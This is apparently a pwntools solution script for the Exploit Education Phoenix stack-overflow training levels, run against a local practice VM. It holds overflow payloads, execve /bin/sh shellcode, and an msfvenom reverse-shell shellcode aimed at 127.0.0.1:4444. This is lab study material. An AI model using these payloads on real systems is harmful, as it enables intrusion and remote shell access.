import sys
from pwnlib.asm import asm
from pwnlib.context import context
from pwnlib.tubes.ssh import ssh
from pwnlib.shellcraft import amd64
from pwnlib.util.packing import p8, p32, p64

HOSTNAME = "localhost"
PORT = 2222
USERNAME = "user"
PASSWORD = "user"
BINARY_NAME = None


def run(payload=None, args=None, env=None):
    conn = ssh(host=HOSTNAME, port=PORT, user=USERNAME, password=PASSWORD)
    cmd = [f'/opt/phoenix/amd64/{BINARY_NAME}']
    if args:
        cmd.append(args)
    p = conn.process(cmd, env=env)
    if payload:
        print(p.recv())
        print(f'Sending payload: {payload}')
        p.send(payload)
    print(p.recvall())

def stack_zero():
    run(payload=b'x'*64 + p8(0x31) + b'\n')

def stack_one():
    run(args=b'x'*64 + p32(0x496c5962) + b'\n')

def stack_two():
    run(env={'ExploitEducation': b'x'*64 + p32(0x0d0a090a) + b'\n'})

def stack_three():
    # gdb -> info functions -> print &complete_level
    run(payload=b'x'*64 + p64(0x40069d) + b'\n')

def stack_four():
    # buffer(64) + ret(8) + ? + rbp + eip
    run(payload=b'x'*64 + p64(0x1337) + p64(0x0) + p64(0x0) + p64(0x40061d) + b'\n')

def stack_five():
    buffer_len = 128
    exit_syscall = b'\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80'
    #shellcode=b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x69\x64\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05' + exit_syscall
    #shellcode = b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x69\x64\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05' + exit_syscall
    shellcode = b'\x48\x31\xd2\x48\x31\xf6\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\xb8\x3b\x00\x00\x00\x0f\x05' + exit_syscall
    #shellcode = b'\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\xb8\x3b\x00\x00\x00\x0f\x05\xbb\x00\x00\x00\x00\xb8\x01\x00\x00\x00\xcd\x80' + exit_syscall
    #context(arch='amd64', os='linux')
    #shellcode = asm(amd64.linux.sh())

    # https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-five-solution/
    # msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform linux -a x64 -f python
    shellcode = b'\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05'

    padding = b'x' * (buffer_len - len(shellcode))
    rbp = 0x00007fffffffe660
    ret = p64(rbp - buffer_len)
    payload=shellcode + padding + p64(0xdeadbeef) + ret + b'\n'
    with open('x', 'wb') as f:
        f.write(payload)
    #run(payload)

if len(sys.argv) < 2:
    print(f'USAGE: python {sys.argv[0]} TASK_NAME')
    sys.exit()

BINARY_NAME = sys.argv[1]
name = BINARY_NAME.replace('-','_')
fn = globals().get(name)
if fn:
    fn()
else:
    print(f'Function {name} is not found')
